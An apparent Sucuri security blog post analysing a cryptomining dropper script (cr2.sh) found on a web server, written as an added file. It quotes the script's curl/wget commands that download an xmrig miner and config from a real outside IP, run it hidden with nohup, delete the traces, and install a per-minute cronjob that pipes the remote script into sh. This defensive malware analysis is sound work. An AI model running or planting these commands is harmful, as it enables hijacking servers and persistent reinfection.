@@ -1,0 +1,68 @@
+Cryptomining Dropper and Cronjob Creator
+
+Recently, someone reached out to us about a malicious process they had discovered running on their web server. This process was maxing out the CPU, which is not unusual when a cryptominer process is running without any throttling.
+Below is an example of what this kind of process looks like when using the ps -aux command:
+
+Malicious Processes on Web Servers
+So, what creates this malicious process in the first place? The correct answer is a malicious, executable bash file that exists on the web server.
+In this case, the malicious bash file has a seemingly random name of cr2.sh.
+After the bash file is executed, it kills any processes from a list of process names related to its cryptominer operation including xmrig, cryptonight, and a few others.
+It then checks to see whether the malicious process is already running and sends a request to a PHP file hosted on a separate server.
+This file outputs the IP address that grabs the actual cryptominer content run by the malicious process:
+if [ ! "$(ps -fe|grep '/tmp/php -c /tmp/p.conf' |grep -v grep)" ]; then
+
+f1=$(curl 82.146.53/g.php)
+
+if [ -z "$f1" ];
+
+then f1=$(wget -q -O - 82.146.53/g.php)
+
+fi
+As you can see, it performs an initial attempt with a curl request. If that doesn’t return anything, it tries a second time with the wget command. Note: The returned IP value is saved as $f1 variable. After it has determined whether the OS environment is 32 or 64 bit, this value is used to download the cryptominer payload through the same curl/wget request:
+if [ `getconf LONG_BIT` = "64" ]
+
+then
+
+$WGET /tmp/php http://$f1/xmrig_64?$RANDOM
+
+else
+
+$WGET /tmp/php http://$f1/xmrig_32?$RANDOM
+As shown above, it saves the downloaded cryptominer payload as /tmp/php. However; we are still missing a crucial part to run this cryptominer. Attackers also need a configuration file, which is used to ensure the cryptomining activity is properly tracked and awarded for the work it has done.
+In this case, the attackers chose to keep this configuration file on the same server used to download the cryptominer:
+f2="82.146.53.166"
+
+chmod +x /tmp/php
+
+$WGET /tmp/p.conf http://$f2/p.conf
+The script has now downloaded to the web server all of the necessary content to go ahead and spawn the process using nohup, which allows the process to continue running regardless if the user ends their bash session.
+Since the process is loaded to memory, it no longer requires the actual /tmp/php and /tmp/p.conf files and they can be deleted to further hide the activity:
+nohup /tmp/php -c /tmp/p.conf>/dev/null 2>&1 &
+
+sleep 5
+
+rm -rf /tmp/p.conf
+
+rm -f /tmp/php
+Just in case someone detects the process and kills it along with the initial cr2.sh file, the file creates a cronjob (unless it exists already). This cron is scheduled to run every minute, re-download the cr2.sh file if it is missing, and execute the malicious bash script.
+This means that a website owner could kill the process and remove all of the malicious files, but the cronjob would execute every minute and restart the process without any action on the hacker’s part.
+if crontab -l | grep -q "82.146.53.166"
+
+then
+
+echo "Cron exists"
+
+else
+
+echo "Cron not found"
+
+…
+
+(crontab -l 2>/dev/null; echo "* * * * * $LDR http://82.146.53.166/cr2.sh | sh > /dev/null 2>&1")| crontab -
+Always Check the Cron Spool
+This demonstrates why you should check the cron spool after any security incident, or as part of a comprehensive scan. If you overlook a malicious cronjob, it can reinfect your environment until it’s mitigated.
+It’s also important to remember that it’s not just web servers that are targeted — it can also infect desktop installations of 32/64bit Linux systems and other variants, which are used to infect Windows installations.
+Conclusion
+This type of cryptomining has waned in popularity as it is easily detected by monitoring scripts on shared hosting environments and managed servers. Malicious actors aren’t able to do much mining before getting killed by monitoring scripts, which detect malicious processes that use up a significant amount of CPU over extended periods of time.
+The attacker’s solution to this detection problem is to offload the mining to the client side of the browser, which leverages Javascript to allow for cryptojacking (a form of cryptomining on the browser’s client side, instead of the web server side).
+If you believe your web server is running malicious processes and you need a hand cleaning it up, we’re here to help. You can also subscribe to the Sucuri blog feed to get email notifications on the latest website security topics.
